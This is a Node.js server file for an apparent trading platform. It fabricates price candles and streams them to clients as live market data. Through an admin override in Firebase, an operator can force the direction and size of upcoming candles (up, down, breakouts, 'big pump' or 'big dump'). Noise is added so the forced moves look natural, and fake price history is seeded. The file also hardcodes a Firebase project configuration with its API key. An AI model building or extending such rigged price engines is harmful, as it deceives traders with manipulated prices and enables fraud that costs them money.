// --- START: server.js (Ultimate Timing & Size Accuracy Engine V6) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 250;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
const adminOverrides = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

db.ref('admin/market_overrides').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    Object.keys(data).forEach(marketId => {
        adminOverrides[marketId] = data[marketId];
    });
});

// 🔥 PERFECT MATH BASED CANDLE GENERATOR 🔥
function generateTargetCandle(timestamp, openPrice, cmd, prevCandle) {
    let isGreen = Math.random() > 0.5;
    let baseVol = openPrice * 0.00005;
    
    let prevBody = baseVol;
    let prevColor = 'UNKNOWN';
    if (prevCandle) {
        prevBody = Math.abs(prevCandle.close - prevCandle.open);
        if (prevBody < baseVol * 0.3) prevBody = baseVol; // Base limit if prev was doji
        prevColor = prevCandle.close >= prevCandle.open ? 'GREEN' : 'RED';
    }

    let body = baseVol * (0.8 + Math.random());
    let upWick = baseVol * Math.random();
    let dnWick = baseVol * Math.random();

    if (cmd) {
        const type = cmd.type;

        if (type.includes('UP')) isGreen = true;
        if (type.includes('DOWN')) isGreen = false;

        // User Custom Logics: Inside, Breakout, 2X, Opposite
        if (type.includes('INSIDE')) {
            body = prevBody * (0.40 + Math.random() * 0.30); // 40% to 70% of previous
            upWick = body * 0.2; dnWick = body * 0.2;
        } 
        else if (type.includes('BREAKOUT')) {
            body = prevBody * (1.30 + Math.random() * 0.50); // 130% to 180% of previous
            upWick = body * 0.3; dnWick = body * 0.3;
        } 
        else if (type.includes('2X')) {
            body = prevBody * (2.0 + Math.random() * 0.20); // Exact 2X (200% to 220%)
            upWick = body * 0.5; dnWick = body * 0.5;
        } 
        else if (type === 'OPPOSITE_BREAKOUT') {
            isGreen = (prevColor === 'RED'); // Opposite Color
            body = prevBody * (1.30 + Math.random() * 0.50); // Breakout Size
            upWick = body * 0.3; dnWick = body * 0.3;
        } 
        else if (type.startsWith('PATTERN_')) {
            if (type === 'PATTERN_DOJI') {
                body = baseVol * 0.1; upWick = baseVol * 3; dnWick = baseVol * 3;
                isGreen = Math.random() > 0.5;
            } else if (type === 'PATTERN_MARUBOZU_GREEN') {
                isGreen = true; body = prevBody * 1.5; upWick = 0; dnWick = 0;
            } else if (type === 'PATTERN_MARUBOZU_RED') {
                isGreen = false; body = prevBody * 1.5; upWick = 0; dnWick = 0;
            } else if (type === 'PATTERN_HAMMER') {
                isGreen = true; body = prevBody * 1.2; upWick = 0; dnWick = body * 3.0;
            } else if (type === 'PATTERN_SHOOTING_STAR') {
                isGreen = false; body = prevBody * 1.2; upWick = body * 3.0; dnWick = 0;
            } else if (type === 'PATTERN_BIG_PUMP') {
                isGreen = true; body = prevBody * 3; upWick = baseVol; dnWick = baseVol;
            } else if (type === 'PATTERN_BIG_DUMP') {
                isGreen = false; body = prevBody * 3; upWick = baseVol; dnWick = baseVol;
            }
        }
    }

    const close = isGreen ? openPrice + body : openPrice - body;
    const high = Math.max(openPrice, close) + upWick;
    const low = Math.min(openPrice, close) - dnWick;

    const target = { timestamp, open: roundPrice(openPrice), close: roundPrice(close), high: roundPrice(high), low: roundPrice(low) };

    // Create Analytics Payload (Will be saved ONLY when candle finishes)
    let analyticsPayload = null;
    if (cmd && cmd.id) {
        analyticsPayload = {
            command: cmd.type,
            targetTime: timestamp,
            marketId: cmd.marketId,
            prevCandle: { open: prevCandle?.open || openPrice, close: prevCandle?.close || openPrice, color: prevColor, size: prevBody },
            targetCandle: { open: target.open, close: target.close, color: isGreen ? 'GREEN' : 'RED', size: body },
            executedAt: Date.now()
        };
    }

    return { target, analyticsPayload };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const { target } = generateTargetCandle(nowPeriod - (i * TIMEFRAME), currentPrice, null, null);
        candles.push(target);
        currentPrice = target.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        targetCandle: null,
        currentNoise: 0,
        pendingAnalytics: null // Holds data until candle completes
    };
}

function ensureTargetCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];

    // 🔥 SAVE ANALYTICS ONLY AFTER THE CANDLE FULLY CLOSES 🔥
    if (marketData.pendingAnalytics && currentPeriod > marketData.pendingAnalytics.targetTime) {
        const pa = marketData.pendingAnalytics;
        db.ref(`admin/market_overrides/${pa.marketId}/status`).set('Executed');
        db.ref(`admin/command_analytics/${pa.id}`).set(pa.payload);
        marketData.pendingAnalytics = null; // Clear it after saving
    }
    
    if (!marketData.targetCandle || marketData.targetCandle.timestamp !== currentPeriod) {
        
        let overrideCmd = null;
        if (adminOverrides[marketData.marketId]) {
            const cmd = adminOverrides[marketData.marketId];
            if (currentPeriod === cmd.targetTime && cmd.status !== 'Executed') {
                overrideCmd = cmd;
            }
        }

        const { target, analyticsPayload } = generateTargetCandle(currentPeriod, lastCandle.close, overrideCmd, lastCandle);
        
        marketData.targetCandle = target;
        marketData.currentNoise = 0; 
        
        if (overrideCmd && analyticsPayload) {
            marketData.pendingAnalytics = {
                id: overrideCmd.id,
                marketId: overrideCmd.marketId,
                targetTime: currentPeriod,
                payload: analyticsPayload
            };
        }
        
        const newCandle = { timestamp: currentPeriod, open: target.open, high: target.open, low: target.open, close: target.open };
        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        
        marketData.currentPrice = target.open;
    }
}

function updatePriceSmoothly(marketData, currentPeriod) {
    const target = marketData.targetCandle;
    if (!target) return;

    const liveCandle = marketData.history[marketData.history.length - 1];
    const timeElapsed = Date.now() - currentPeriod;
    const progress = Math.min(timeElapsed / 60000, 1.0); 

    const expectedBasePath = target.open + ((target.close - target.open) * progress);
    
    const noiseMaxAllowed = Math.abs(target.close - target.open) * 0.15 * (1 - progress); 
    let tickDelta = (Math.random() - 0.5) * noiseMaxAllowed;
    
    marketData.currentNoise += tickDelta;

    if (Math.abs(marketData.currentNoise) > noiseMaxAllowed) {
        marketData.currentNoise *= 0.5;
    }

    if (progress > 0.1 && progress < 0.8 && Math.random() < 0.05) {
        if (Math.random() > 0.5) marketData.currentNoise = (target.high - expectedBasePath) * Math.random();
        else marketData.currentNoise = (target.low - expectedBasePath) * Math.random();
    }

    let newPrice = expectedBasePath + marketData.currentNoise;

    if (progress >= 0.95) {
        newPrice = target.close;
    }

    marketData.currentPrice = newPrice;

    liveCandle.close = roundPrice(newPrice);
    liveCandle.high = roundPrice(Math.max(liveCandle.high, liveCandle.close, target.open));
    liveCandle.low = roundPrice(Math.min(liveCandle.low, liveCandle.close, target.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        ensureTargetCandle(marketData, currentPeriod);
        updatePriceSmoothly(marketData, currentPeriod);
        broadcastCandle(marketId, marketData.history[marketData.history.length - 1]);
    }

    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: lastC.close, timestamp: lastC.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Strict Engine V6 Running'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));